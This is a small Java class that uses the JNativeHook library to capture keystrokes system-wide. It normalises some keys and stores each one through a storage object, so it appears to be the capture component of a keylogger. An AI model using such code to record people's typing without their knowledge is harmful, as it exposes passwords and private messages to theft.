package org.example;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keyboard implements NativeKeyListener {

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
        String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
        if (key.equalsIgnoreCase("space")){
            key = " ";
        } else if (key.equalsIgnoreCase("backspace")) {
            key = " BORRAR ";
        } else if (key.equalsIgnoreCase("minus")) {
            key = "-";
        } else if (key.contains("0xe36")){
            key = "_";
        }else if (key.equalsIgnoreCase("period")){
            key = ".";
        } else if (key.equalsIgnoreCase("comma")) {
            key = ",";
        }
        Main.storage.store(key.toLowerCase());
    }
}
